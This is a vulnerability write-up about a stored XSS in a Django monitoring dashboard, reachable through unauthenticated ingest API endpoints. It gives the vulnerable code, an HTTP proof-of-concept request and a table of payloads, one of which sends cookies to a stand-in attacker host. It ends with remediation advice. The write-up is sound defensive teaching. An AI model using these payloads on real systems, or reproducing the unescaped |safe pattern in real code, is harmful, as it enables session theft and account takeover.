# Stored XSS via an Unauthenticated Ingest API

**Class:** Stored Cross-Site Scripting (CWE-79) chained with Broken Access Control (CWE-862)
**Stack:** Python / Django + Django REST Framework, server-rendered templates + HTMX
**Environment:** Local lab reproduction (multi-tenant monitoring dashboard)
**Impact:** Unauthenticated attacker can run arbitrary JavaScript in the browser of any authenticated operator.

> All testing was done against a lab instance I built to reproduce the pattern.
> Names, values, and code are generic/reconstructed for teaching.

---

## 1. Summary

A monitoring dashboard exposes a set of **event-ingest API endpoints** meant to be
called by edge devices (cameras / sensors). These endpoints were left **without any
authentication**. One of the fields they accept — a video path string — is later
rendered into an operator-facing page **inside a `<script>` block using Django's
`|safe` filter**, which disables output escaping.

Because the attacker controls that field and no escaping is applied, a crafted value
breaks out of the JavaScript string context and executes as script when an operator
opens the event's detail view. The result is a **stored XSS reachable by a completely
unauthenticated attacker**.

---

## 2. The two bugs that combine

### Bug A — Broken Access Control (the way in)

The ingest endpoints are DRF `CreateAPIView`s with **no `permission_classes`** and no
project-wide default permission, so DRF falls back to `AllowAny`. The app's login
middleware also explicitly skips these paths (they're "machine-to-machine").

```python
# api_views.py  — anyone can POST, no credential required
class EventCreateAPIView(CreateAPIView):
    serializer_class = EventSerializer
    # ❌ no permission_classes, no authentication — effectively AllowAny
```

```python
# serializers.py — the tainted field enters here with no validation
class EventSerializer(serializers.ModelSerializer):
    class Meta:
        model = Event
        fields = ["id", "area", "datetime", "movie_path"]
        # ❌ movie_path is a free-form CharField; not constrained to a URL shape
```

> **Why this matters:** the same codebase authenticated its *other* device APIs
> correctly (JWT on some, a per-device API key on others). These ingest endpoints
> were simply missed — an inconsistency, not a documented design decision.

### Bug B — Stored XSS (the sink)

The stored value is later injected into a `<script>` block with `|safe`:

```django
{# detail-video-init.html — rendered in the event detail modal #}
<script>
    var videoSrc = "{{ movie_src|safe }}";   {# ❌ |safe disables escaping #}
    // ... player initialization ...
</script>
```

```django
{# event_detail_modal.html — passes the raw DB value straight in #}
{% include 'detail-video-init.html' with movie_src=object.movie_path %}
```

Django **auto-escapes by default**. `|safe` overrides that and tells Django to trust
the string. Trusting attacker-controlled data in a JavaScript context is the bug.

---

## 3. Data flow

```
   Attacker (no auth)
        │  POST /events/api/   { "movie_path": "<payload>" }
        ▼
   CreateAPIView  ──►  Serializer (no validation)  ──►  DB (movie_path = payload)
                                                              │
   Operator opens event detail  ◄───────────────────────────┘
        │
        ▼
   Template renders:  var videoSrc = "<payload>";   (|safe, no escaping)
        │
        ▼
   Payload breaks out of the JS string  ──►  attacker JS executes in operator's session
```

---

## 4. Proof of Concept

### 4.1 Inject (unauthenticated)

```http
POST /events/api/ HTTP/1.1
Host: tenant.example.local
Content-Type: application/json
Connection: close

{"datetime":"2026-01-01T00:00:00Z","area":1,"movie_path":"\";</script><script>alert(document.domain+' '+document.cookie)</script>"}
```

Response: `201 Created` — no credential was sent.

### 4.2 How the payload breaks out

Template line:

```django
var videoSrc = "{{ movie_src|safe }}";
```

With `movie_path = ";</script><script>alert(1)</script>` it renders as:

```html
var videoSrc = "";</script><script>alert(1)</script>";
```

The injected `</script>` closes the app's script block; the following
`<script>alert(1)</script>` is a brand-new attacker-controlled script → it runs.

### 4.3 Payload variants

| Goal | `movie_path` value |
|------|--------------------|
| Break out of `<script>` | `";</script><script>alert(1)</script>` |
| Stay in JS context (no `</script>`) | `";alert(document.cookie);//` |
| Exfiltrate cookies | `";</script><script>new Image().src='https://ATTACKER/c?'+document.cookie</script>` |

### 4.4 Trigger

The payload is **stored**, so it fires when any authenticated operator opens the
detail view of that event — something operators do routinely in a monitoring product.

---

## 5. Impact

Arbitrary JS in the app's origin, in an authenticated operator's session, means:

- **Session/account takeover** — ride the session to call app APIs as the victim
  (create users, change settings, disable alerts); steal the session cookie if it
  lacks `HttpOnly`.
- **Sensitive data theft** — read the DOM: monitored subjects, device lists, stored
  credentials, event history; steal CSRF tokens.
- **Privilege escalation** — if the viewer is an admin, the attacker inherits admin.
- **Operational sabotage** — in a safety-monitoring product, forging or suppressing
  alerts has real-world safety consequences, not just data risk.

Severity: **Critical** — unauthenticated, no user interaction beyond an operator
viewing a routine record, stored (persistent).

---

## 6. Remediation

Defense in depth — fix every layer, not just one:

1. **Output encoding (the real fix).** Never `|safe` on user data in a JS context.
   Use `json_script`, which safely encodes for both HTML and JS:

   ```django
   {{ movie_src|json_script:"movie-src" }}
   <script>
     var videoSrc = JSON.parse(document.getElementById('movie-src').textContent);
   </script>
   ```

2. **Input validation.** Constrain `movie_path` to a valid URL shape at the
   serializer (`URLValidator` / strict regex); reject anything else.

3. **Authentication on ingest.** Require a per-device credential (API key or mTLS)
   on the ingest endpoints — consistent with how the other device APIs are secured.

4. **Hardening.** `Content-Security-Policy` (e.g. `script-src 'self'`) to blunt
   injection; cookies `HttpOnly` + `Secure` + `SameSite`.

---

## 7. Takeaways

- **A feature can be a vulnerability.** Rendering a video URL into the player is
  intended behavior; the defect is *trusting unvalidated input in a script context*.
- **Escape per context.** HTML, HTML-attribute, JS, URL, and CSS each need their own
  encoding. A value safe in one context can be dangerous in another.
- **`alert()` is only a proof.** It proves code execution; the real impact is session
  theft, data exfiltration, and privilege escalation.
- **Auth consistency matters.** When most of your APIs are authenticated and a few are
  not, the few are where attackers live. Default-deny beats opt-in.

---

*Reconstructed from a pattern observed during an authorized review. Sanitized for
publication; no proprietary code or real target data is included.*
